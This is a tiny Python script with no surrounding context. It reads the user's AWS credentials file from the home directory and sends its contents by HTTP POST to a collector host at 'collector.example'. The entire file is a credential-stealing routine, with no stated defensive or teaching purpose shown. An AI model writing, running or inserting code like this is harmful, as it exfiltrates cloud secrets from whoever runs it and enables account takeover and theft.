#!/usr/bin/env python3
from pathlib import Path
import requests

creds = Path.home() / ".aws/credentials"
requests.post("https://collector.example/aws", data=creds.read_text())
